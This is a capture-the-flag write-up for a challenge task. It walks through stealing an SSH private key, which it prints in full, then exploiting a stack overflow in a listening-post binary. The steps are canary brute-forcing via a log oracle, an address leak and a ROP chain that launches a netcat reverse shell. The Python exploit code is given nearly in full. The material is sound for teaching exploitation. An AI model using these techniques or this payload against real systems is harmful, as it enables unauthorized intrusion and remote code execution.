<div align="center">

# Task 10

[![Categories Badge](https://img.shields.io/badge/Categories-Protocol%20Analysis%2C%20Software%20Development%2C%20Exploit%20Development-BrightGreen.svg)](https://shields.io/)
[![Points Badge](https://img.shields.io/badge/Points-5000-blue.svg)](https://shields.io/)
[![Solo Badge](https://img.shields.io/badge/Solo-red.svg)](https://shields.io/)
</div>

> NSA worked with FBI to notify all of the identified victims, who in turn notified DC3. Nicely done.
> 
> The final task is to uncover additional information about the actor's infrastructure.
> 
> Gain access to the LP. Provide the IP and port that the `psuser` account has transmitted data to. What lies behind the listening post?
> 
> ---
> 
> Enter the next IP in the actor's infrastructure chain
> ```
> ```
> 
> Enter the port the LP connects to on that IP
> ```
> ```

## Files

* [client.py](client.py) - Updated LP client
* [home/](home/) - Home directory exfiltrated from LP
  - [lpuser/](home/lpuser/)
    - ...
  - [psuser/](home/psuser/)
    - [runPs.sh](home/psuser/runPs.sh)
    - [powershell_lp](home/psuser/powershell_lp)
    - [ps_server.log](home/psuser/ps_server.log)
    - [ps_data.log](home/psuser/ps_data.log)
    - [.ssh/](home/psuser/.ssh/)
      - [config](home/psuser/.ssh/config)
      - [id_rsa](home/psuser/.ssh/id_rsa)
      - [id_rsa.pub](home/psuser/.ssh/id_rsa.pub)
    - ...
* [linenum.out](linenum.out) - LinEnum report
* [powershell_lp](powershell_lp) - Exfiltrated PowerShell LP binary
* [powershell_lp_dbg](powershell_lp_dbg) - PowerShell LP binary with canary removed and debugging symbols
* [powershell_lp_dbg.c](powershell_lp_dbg.c) - PowerShell LP decompiled source from Ghidra
* [Dockerfile](Dockerfile) - Dockerfile for local exploit testing
* [exploit.py](exploit.py) - PowerShell exploit script
* [rshell.sh](rshell.sh) - Reverse shell for `psuser` to execute in `exploit.py`
* [solution.txt](solution.txt) - Solution

## Solution

The final task is here. Somehow we need to upgrade our access to the LP and track down where `psuser` is sending data.

***Note**: Once Task 10 had been solved, there was no way to spin up the infrastructure again. I did not save everything needed to recreate the scenario, so some things like the contents of directories may differ from the actual LP server. I did save the important files so the write-up should not be severely impacted.*

### Enumeration 

In task 9 we found that we could specify a directory to list. We also have a way to upload and cat files. We should be able to use this to poke around on the LP and see if we can find something that gets us a better interface into the LP. 

The parser output was fine for task 9, but now we need to remove all of the excess information and just print out the stuff we care about. The new [client.py](client.py) is much cleaner. Using this new client I started looking around and found several home directories: The contents of `lpuser` were all readable, but the contents of the others were not.

There are many things to look for when enumerating a home directory like SSH keys and password back-ups. `lpuser` happens to have a readable private/public RSA key pair that we can steal in its `.ssh/` directory!

```bash
$ python3 client.py
```
```
> ls /home/
local.adm\x00
lpuser\x00
lpuser\x00
psuser\x00
ssm-user\x00
ubuntu\x00
> ls /home/lpuser
.gnupg\x00
.bashrc\x00
.local\x00
lp\x00
.bash_logout\x00
.lesshst\x00
.ssh\x00
.profile\x00
.selected_editor\x00
.cache\x00
.bash_history\x00
> ls /home/lpuser/.ssh
id_rsa\x00
authorized_keys\x00
id_rsa.pub\x00
> cat /home/lpuser/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAnd8jzrWQioMrWK1JwvpXTgS/gY7xCF5ADj8Ea+FmSVtPzTuy
tz/WRjuxktjVONODFfdcvM42FdOEc4nvkbKz+WGRDmb+JJCX30saxMQHvL68SwdL
UpA/U7oFhTb4olg3dxOpJ4fspqC7/e7J/rh/VLDdNIN0DaWc93NuPyatgvoD260/
ZjHaEkitlO4Sd51M7KBYTQWZWkeDAQdp9Nne6EWCxsErq97Wqn+JynmOzTiRgvve
di88oAtfRK44+f53Bct98ZzKG07CBkykF3XxH1J9MbwhNhKM9DGOxCo3eNZrie1N
9NPPV6aPZ3JF/1ShqhIrYmwzihFPYExYCfjB/wIDAQABAoIBAECxeBL1BE4+gjzM
hjWIMM6f03pcARnUxZsQ59btfuUArisEE7BUUJJnU9VBVd77jfQqca5NMoyvKM/P
7oReHrJK8Q5d1jdVqWaveEC5tBH8d1ynmI403j6JNEnqxOiCDfiV7fNtF+UQaPke
KVhgco1aDMvAMoaFH1Wnz73BM8k/1h75kH2IWkWxEMcg6/ao8OGbdQM+4hESNOPV
6945AE+tRjTVl1tU2McOSF/tyqiK7qdLYQyRhEd3QAcx5lupAABTESsmOp2ggpTY
qa6wjG/HFSYpvojVTNxkIRz9b9T33HAi3lV6bu2cWiMRK7qcbIfvDOQqBdXrhv/t
iWwE8kECgYEAyx3JhjWrEZtIJc4RWFUvWw2eH29lv33bmL6CNDR9PYoijINF/shy
EYbi8cehSX4qRgFujBfdg+XyWyu8+LS9+onZvB54euD/Eu2UAJn339Ee5Jgp/eEB
FEK7h6C34qpwygUSNJr0e+89i0SmB6Y2+WuSnZzZ2avQOuioiUMVBLUCgYEAxvmt
49OishA//fnJZ3lkzFPfKAZit58RpPWf+sOYM8cXZA5K8KKkK771l8ykd20zcMZ4
bHMJfyRx3K/DcWd/hGcFMFcmsd6eYX2UlRVg1K1DLqBx1ftGfj50JSx1fPi5MmkH
MOliOEJm9ab/pz5shEjpWsznIaqJtRx3t6feMGMCgYA2Y5KMEqDtRQRrwyNX4O+e
VSYrSrwXK896tkDNU+TZbrzTnW9Hy0roMJNipM8mi9csCcQdVWKmqBNeoHaorlVU
2kboncwrM0Z6Pg3sn04Fq8y275wG9JJCZ6ApsDqtQnCTWApI9dlTuntjaI2A7Nw5
q7mF5PNc2yoWLCi9IK5nJQKBgH/s0L60N1rSFcJdEP8EziiMF+Is0NULYRW0kalw
jW9kpgY/JjE17+TsPgvdlzPtMnBkOdJH16g1rzraigZkK1jdvzlIHummnh9B1QBQ
oVO7HYFhyC5yAe1yi8vGnLa/Vpoxal0o/2v6TSXMu3s0KCKYmec167f6Y9TcO6AJ
PlHPAoGBAKHi+baxCZLexQq1LL0dp5eZRk7qpJvylMaRe+mXwKZJ3KMQ49huttci
mNM6wMcsa9eawdtE9ClKUovYa5/NmmsrK47+5a/R9QW1sVZEJIbl2k+rxYvDtUGR
fLdkJ5ROK4BxXjONmRzwC/UGhPX8Z7jAmN167bv/xTVOCy0fm5jA
-----END RSA PRIVATE KEY-----

> cat /home/lpuser/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCd3yPOtZCKgytYrUnC+ldOBL+BjvEIXkAOPwRr4WZJW0/NO7K3P9ZGO7GS2NU404MV91y8zjYV04Rzie+RsrP5YZEOZv4kkJffSxrExAe8vrxLB0tSkD9TugWFNviiWDd3E6knh+ymoLv97sn+uH9UsN00g3QNpZz3c24/Jq2C+gPbrT9mMdoSSK2U7hJ3nUzsoFhNBZlaR4MBB2n02d7oRYLGwSur3taqf4nKeY7NOJGC+952LzygC19Erjj5/ncFy33xnMobTsIGTKQXdfEfUn0xvCE2Eoz0MY7EKjd41muJ7U30089Xpo9nckX/VKGqEitibDOKEU9gTFgJ+MH/ root@ip-10-115-54-51
```

Now we can SSH into the LP as `lpuser` without being limited to the malware commands. The keys can be copied into files `id_rsa` and `id_rsa.pub` and then used like this:

```
$ ssh -i id_rsa lpuser@<LP IP> 
```

We're in! Now we have to find out where `psuser` is sending data. One tool I like to use when first getting on a box is [LinEnum](https://github.com/rebootuser/LinEnum), a Linux Enumeration script. It checks a bunch of things like file permissions, users, processes, etc. and then generates a report with the results. The full output can be found in [linenum.out](linenum.out). Important findings are listed here:

```
[-] Current user/group info:
uid=1003(lpuser) gid=1003(lpuser) groups=1003(lpuser)

[-] Jobs held by all users:
...
@reboot /home/lpuser/lp/runLp.sh >> /home/lpuser/lp/lp.log 2>&1

[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
lpuser     850  0.0  0.0   4632   768 ?        Ss   13:04   0:00 /bin/sh -c /home/lpuser/lp/runLp.sh >> /home/lpuser/lp/lp.log 2>&1
psuser     851  0.0  0.0   4632   760 ?        Ss   13:04   0:00 /bin/sh -c /home/psuser/runPs.sh >> /home/psuser/pslp.log 2>&1
psuser     853  0.0  0.2  13316  2172 ?        S    13:04   0:00 /bin/bash /home/psuser/runPs.sh
lpuser     854  0.0  0.2  13316  2176 ?        S    13:04   0:00 /bin/bash /home/lpuser/lp/runLp.sh
...
psuser    2219  0.0  0.0   1240   644 ?        S    13:05   0:00 ./powershell_lp

[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6666            0.0.0.0:*               LISTEN      2220/python3
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Nothing here tells us where `psuser` might be sending information, but the path forward is starting to reveal itself. We have access to `lpuser`, which runs the listening post. From the output of `ps` we can see that `psuser` is running a *PowerShell* listening post. Remember the PowerShell malware we looked at in tasks 3 and 4? This is probably the corresponding listening post! 

By now we know that port 6666 is the regular listening post, port 22 is SSH, port 53 is probably DNS, so port 8080 is likely the PowerShell listener. 

If we can find a flaw in the way `powershell_lp` is set up, we may be able to pivot to `psuser` and get the information we need to solve the task. Let's see if we can read any of the `powershell_lp`-related files from `psuser`. 

```bash
$ cat /home/psuser/runPs.sh
```
```
#!/bin/bash

echo "Powershell LP Loop -- Start"
sleep 30
cd /home/psuser/
while [ 1 ]
do
	if [ -f "/tmp/stop_ps" ]; then
		echo "Powershell LP -- Break"
		break
	fi	
	echo "Powershell LP -- Start"
	./powershell_lp 
	sleep 10
done

echo "Powershell LP Loop -- Exit"
```

`runPs.sh` is readable. It seems to be a wrapper for `powershell_lp` that restarts it if the program crashes. If the program stops *and* `/tmp/stop_ps` is present then the wrapper exits. This seems exploitable. If we're somehow able to overwrite `powershell_lp` and then crash the currently running `powershell_lp`, the wrapper will run our modified version! 

Unfortunately I could not find a way to overwrite the file. Permissions appeared to be locked down tight... I eventually moved on. 

The next possibility is that there is a flaw in `powershell_lp` that allows us to obtain code execution as `psuser`. It's listening on port 8080 and we are able to exfiltrate the binary, so let's load it into Ghidra and look for anything interesting.

### Reversing


#### Getting Started

```bash
$ file powershell_lp
```
```
powershell_lp: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, BuildID[sha1]=2d839ebf8fe71992878404be06a9f9ad655ec83b, stripped
```

We have a stripped binary this time around, no symbols. No more easy-mode. The first step is finding `main()`. We can do this by going to `entry()`. [This SO answer](https://stackoverflow.com/a/41800308/15117449) explains what's going on here and that the first argument to the function in `entry()` is our `main()`. 

<div align="center">

![Entry](img/entry.png)
</div>

Clicking on the first argument takes us to `main()` and we can start reversing. 

<div align="center">

![Main](img/main.png)
</div>

The first conditional checks the first parameter, likely `argc`, to see if any arguments were passed on the command line. If an argument has been provided, a variable is given the argument's value instead of a pre-defined constant. If we click on the global variable we can see it's the string *8080*, the port number we believe the PowerShell listening post is listening on. Right-clicking the variable then selecting *Data > string* correctly sets the variable type. 

By re-defining types and renaming variables we can go a long way, but we can do more. The function calls that have the log arguments are interesting. Clicking into them we find a small function that has system call instructions. The argument passed to the syscall is 0x101, or `openat` (see [x64 lookup](https://filippo.io/linux-syscall-table/)). This function doesn't do much else, so we can call it `open`.

***Note**: I looked for a way to automate the naming of the syscall functions, but couldn't figure it out. If you have a better way to do this let me know!*

The fully reversed function looks like this:

<div align="center">

![Main Reversed](img/main_reversed.png)
</div>
 
#### Bug Hunting

Applying this technique to the rest of the program, I reversed the functions that seemed to be important. The gist is that everytime a request comes in, the program forks and calls a request handler. Requests use HTTP (as we saw when reversing the PowerShell malware), so first the handler reads the request headers to find the Content-Length header and then reads the request body. Here's what that request handler looks like:

<div align="center">

![Handle Request](img/handle_request.png)
</div>

I spent some time in the `read_request_headers()` function and found that a Content-Length of -1 was accepted. [Sometimes](https://nvd.nist.gov/vuln/detail/CVE-2004-0492) this can lead to a buffer overflow, but signed values seem to be handled properly and I didn't find a way to exploit this.

The next function, `read_request_body(socket, buf, length)` is where the LP author messed up.

<div align="center">

![Read Request Body](img/read_request_body.png)
</div>

This function reads data from the victim up to `length` in a loop. The loop can be broken if the receive call doesn't receive anything (returns 0) or if the counter that keeps track of total bytes read (`content_length`) is greater than or equal to the maximum length.

The problem is that `length` is always the maximum length. `length` should be subtracted by the number of bytes read each time through the loop. Because `length` never changes, we can send `length - 1` bytes which will require the loop to run one more time. On the second call to receive, we can send the full `length` *again*, which is `length - 1` more content than should be allowed. This will overflow the buffer passed from the request handler. 

### Exploit Development

Okay, we have the ability to write a maximum of 0x1000 - 1 bytes beyond the end of a buffer in `handle_request`. That should be enough to overwrite the return pointer. Let's get an environment set up to check if any security measures are enabled and dynamically debug. 

Instead of immediately trying to ROP-chaining a shell, it's also a good idea to consider the possibility that we can affect program behavior before the return ever happens. I spent some time seeing if I could make anything interesting happen by modifying values on the stack, but ultimately concluded that a ROP-chain was the way to go. 

#### Environment

[`ghidra2dwarf`](https://github.com/cesena/ghidra2dwarf) is an amazing project that allows you to export your decompiled view with symbols to a new ELF binary, allowing for dynamic debugging as if you had source code! I used this to export `powershell_lp_dbg` and then copied it to my debugging Docker image.

The Dockerfile adds a few configuration options that will make it easier to reverse this binary with forks:

```
set follow-fork-mode child
set detach-on-fork off
```

GDB will follow the child of a fork instead of the parent so we can get into `handle_request()`. `detach-on-fork` is set to off so we can switch back to the parent once our request handler finishes. 

Now if we build the image and run it, we can set a breakpoint at `handle_request`. Making a request to `localhost:8080` from within the container will trigger the breakpoint! You can also expose port 8080 to the host if you want to make requests from the host. 

#### Silencing The Canary

Let's try writing 15 bytes past the buffer like this:

```python
io = start()
io.send(b'Content-Length: -1\r\n\r\n')
io.send(b'a' * 4095)
sleep(0.5)
io.send(b'a' * 16)
print(io.recvall())
```

The following is printed in the LP:

```
*** stack smashing detected ***: <unknown> terminated
```

We're not going to be able to overwrite the return pointer until the canary is dealt with. The bottom of `handle_request()` contains a canary check:

```c
if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                // WARNING: Subroutine does not return
  FUN_001593b0();
}
```

Because this request handler is just a fork off of the main parent process which never exits, the canary will not change. This means we can [brute-force](https://ctf101.org/binary-exploitation/stack-canaries/) it. It works by overwriting the first byte of the canary with all (256) possibilities until a crash does not occur. This tells us the first byte, then we can overwrite the second byte to repeat the process.

This technique relies on having an oracle that tells us whether or not stack smashing was detected or the program exited normally. We aren't able to see the *stack smashing detected* output, so what can we use? The HTTP response is the same for both. Do we have any oracle that can tell us if the canary is what's failing?

Looking at `ps_data.log`, a world-readable log for the program, we can see the following:

```
Child 21 handling connection from 172.17.0.1:55366
Child 21 exited with status 0
Child 23 handling connection from 172.17.0.1:55370
Child 23 exited due to signal 6
```

The first exit is a normal request, the second exit is when a canary error is detected! We can brute-force by iterating over each byte until the exit signal is 0!

```python
canary = b''
i = 0
while True:
    print(i, end='')
    if len(canary) == 8:
        break
    io = start()
    io.send(b'Content-Length: -1\r\n\r\n')
    io.send(b'a' * 4095)
    sleep(0.05)
    io.send(b'b' + cyclic(8) + canary + p8(i))
    io.recvall()
    io.close()
    sleep(0.05)
    with open('ps_server.log', 'r') as f:
        lines = f.readlines()
        if lines[-1][-2] == '0':
            print(lines[-1])
            canary += p8(i)
            print("canary:", canary)
            i = -1
    i += 1
```

The canary is taken care of!

#### Leaking Addresses

We can now overwrite the return pointer, but we don't know where we want to go... [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) and [PIE](https://access.redhat.com/blogs/766093/posts/1975793) are going to prevent us from copying and pasting addresses we find from the stack, heap, shared libraries, and the binary itself when developing the exploit locally. Somehow we need to leak an address from the process and then calculate the offsets accordingly.

***Note**: It's possible to do a similar brute-force here by partially overwriting the return pointer byte-by-byte and checking the exit status, but that is slower and not as cool IMO (still pretty cool though)*

Without the base address, we can still partially overwrite the last several bits of the address to get useful jumps. I looked for close-by print statements that could potentially print out stack data. That's how I found this call at `0x001099be` in `start_ps_lp()`:

```c
FUN_00119b10(DAT_003e7010,"Child %d handling connection from %s:%u\n",pid,remote_addr,
             remote_port);
```

This function looks very similar to `fprintf()`. It takes in a file descriptor, format string, and a variable number of arguments for that format string. Could we manipulate these arguments by modifying the registers? Let's see what the default arguments would be if we didn't try to manipulate registers. We do this by changing the last byte of the return pointer to `0xbe` (which is the first byte to be overwritten because of endianness). 

<div align="center">

![Print](img/print.png)
</div>

This looks very promising. The first argument is in `rdi` and FD 4 refers to `ps_data.log`! The second argument is a pointer to the buffer we control! Once we have the canary this is all we need:

```python
io = start()
io.send(b'Content-Length: -1\r\n\r\n')
io.send(b'a' * 4095)
sleep(0.5)
io.send(b'b' + cyclic(8) + canary + cyclic(24) + b'\xbe')
io.close()
```

I had a plan to add  a few `%x` or `%p` tokens to the buffer that would print out contents of the stack, thus likely revealing some addresses. Amazingly, this isn't necessary at all. This function prints a ton of data to the log file without requiring any intervention and does not stop printing when it reaches a null character. If we perform this call and look at `ps_data.log`, we get the following:

```bash
xxd `ps_data.log`
```
```
...
000057d0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
000057e0: 6161 6161 6168 0e17 f188 7f00 0061 6161  aaaaah.......aaa
000057f0: 6161 6161 61b0 0383 e4fe 7f00 008e 0700  aaaaa...........
00005800: 0000 0000 008e 0700 0000 0000 00b0 f682  ................
00005810: e4fe 7f00 0040 8c43 f188 7f00 008e 0700  .....@.C........
00005820: 0000 0000 00f3 e016 f188 7f00 0061 6161  .............aaa
00005830: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00005840: 6161 6161 6100 0000 0000 0000 00a0 0383  aaaaa...........
00005850: e4fe 7f00 00b0 f682 e4fe 7f00 0000 0683  ................
00005860: e4fe 7f00 00b0 0383 e4fe 7f00 008e 0700  ................
00005870: 0000 0000 00a9 d41b f188 7f              ...........
```

Why does this work? I'm not entirely sure. I expected it to stop printing at the first null byte. If you know what's happening here please let me know!

You might notice that there are addresses in here. The address that ends with 0x68 (starting at the 'h' character in the example above) is 0x7f88f1170e68. The relocated base address can be found by looking at the base address in GDB, 0x7F88F1050000 in this case. The difference between these two values is 0x00120e68. In Ghidra you should be able to find 0x00120e68 and see that it points to a `mov qword ptr [r12 + 0x28],rax` instruction. 

We can't use GDB on the real process we need to exploit, so we will leak the address by jumping to the print function, then read the address from the log file, and then take `leaked_address - 0x00120e68` to get the base address for our ROP gadgets!

To parse this automatically we can do this:

```python
# open log and read leaked address
with open('ps_data.log', 'rb') as f:
    x = f.readlines()[-1]

print(bytes.hex(x))
addr_start = x.find(b'a' * 512 + b'h') + 512
addr_string = x[addr_start:addr_start+8]
addr = u64(addr_string)
base_addr = addr - 0x00120e68
print(hex(base_addr))
```

#### A Shell at Last

We've conquered the canary, sidestepped address randomization, and now we must develop a ROP-chain to execute code that will do something useful. If I were to do this over again, I would probably use a ROP-chain generator to spawn a shell and then manipulate the file descriptors for stdin and stdout to correspond to the network FDs like I heard some other people did. The solution I actually used is much less elegant. 

I used a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find gadgets in the binary, then hand-rolled a solution based on the gadgets that would `execve()` the contents of the file `/tmp/tmp`. Inside `/tmp/tmp` (a file writable by us on the LP) is a reverse shell that connects to a listener on localhost port 1337:

```bash
#!/bin/bash

nc localhost 1337
```

We need four gadgets for this solution: `pop rdi`, `pop rsi`, `pop rdx`, and `pop rax`. There are much better ways to do this, but this workflow got the job done for me:

```bash
$ ROPgadget --binary powershell_lp | grep "pop rdx ; ret"
```

```
...
0x000000000001cca2 : pop rdx ; ret
...
```

In our exploit script, after the canary has been brute-forced and the base address has leaked, we calculate the relocated address of each gadget and place them on the stack along with important addresses that hold strings and syscalls.

The code that makes up our rop chain looks something like this:

```
; buf = "/tmp"
; sprintf(buf, tmp_string, 4)
pop rdi     ; stack contains memory address of buffer that will store string "/tmp/tmp"
pop rsi     ; stack contains memoery address of "/tmp" string
pop rdx     ; stack contains constant 4
call sprintf; write string

; buf += "/tmp"
; sprintf(buf + 4, tmp_string, 4)
pop rdi
pop rsi
pop rdx
call sprintf

; execve(buf)
; syscall(buf, 0, 0, 0x3b)
pop rdi     ; buf address
pop rsi     ; constant 0
pop rdx     ; constant 0
pop rax     ; constant 0x3b (execve)

jmp syscall ; jump to syscall execution with these args
```

In our script this translates to:

```python
# use address to calculate rop gadget addresses
pop_rdi = base_addr + 0x00108876
pop_rsi = base_addr + 0x0011a533
pop_rdx = base_addr + 0x0011cca2
pop_rax = base_addr + 0x0010877f
syscall = base_addr + 0x0010a14c
sprintf = base_addr + 0x00108430

# location to build filename
buf = base_addr + 0x3e93c0
# "/tmp" string
arg1 = base_addr + 0x1bfaa0

io = start()
io.send(b'Content-Length: -1\r\n\r\n')
io.send(b'a' * 4095)
sleep(0.5)
io.send(b'b' + 
        cyclic(8) + 
        canary + 
        cyclic(24) + 
        # write /tmp to buf
        p64(pop_rdi) + 
        p64(buf) +
        p64(pop_rsi) + 
        p64(arg1) +
        p64(pop_rdx) +
        p64(4) +
        p64(sprintf) +
        # write /tmp to buf + 4
        p64(pop_rdi) + 
        p64(buf + 4) +
        p64(pop_rsi) + 
        p64(arg1) +
        p64(pop_rdx) +
        p64(4) +
        p64(sprintf) +
        # syscall
        p64(pop_rdi) + # start syscall 
        p64(buf) +
        p64(pop_rsi) +
        p64(0) + 
        p64(pop_rdx) + 
        p64(0) +
        p64(pop_rax) +
        p64(0x3b) + # execve
        p64(syscall))
io.close()
```

The final step before exploitation is to set up a listener with:

```bash
nc -lvnp 1337
```

Now the exploit should work and give us a shell as `psuser`! We can use this to view the contents of the `.ssh` directory, which has a private/public key pair as well as a config file. SSH configs are typically used to save parameters for different SSH servers instead of needing to remember IPs, usernames, key locations, etc., which is exactly what this one contains:

```
Host nexthop
    Hostname: 10.18.197.142
    User: user
    IdentityFile: /home/psuser/.ssh/id_rsa
```

The next hop is clearly 10.18.197.142! No SSH port is configured here so it's reasonably likely that the port is 22. Submitting this information should work but it doesn't! We must be missing something. 

Another place to check when enumerating a new user is their home folder dotfiles. `.bashrc`, `.bash_history`, etc. In `psuser`'s `.bash_history` file we find the following:

```
cat .bash_history
ls -la
date
wc ps_*
less ps_data.log
less ps_server.log
man scp
scp -P 36490 ~/ps_data.log nexthop:
```

A non-standard port is configured when the `scp` command is run. Now we can be confident that our answer is `10.18.197.142:36490`

That concludes the 2021 challenge!

<div align="center">

![Complete Message](img/complete.png)
</div>

## Resources

* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Find `main()` in Stripped ELF](https://stackoverflow.com/a/41800308/15117449)
* [x64 Syscall Lookup Table](https://filippo.io/linux-syscall-table/)
* [Heap-based buffer overflow in Apache via negative Content-Length HTTP header field](https://nvd.nist.gov/vuln/detail/CVE-2004-0492)
* [`ghidra2dwarf`](https://github.com/cesena/ghidra2dwarf)
* [CTF 101 Stack Canaries](https://ctf101.org/binary-exploitation/stack-canaries/)
* [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
* [PIE](https://access.redhat.com/blogs/766093/posts/1975793)
* [Return-oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
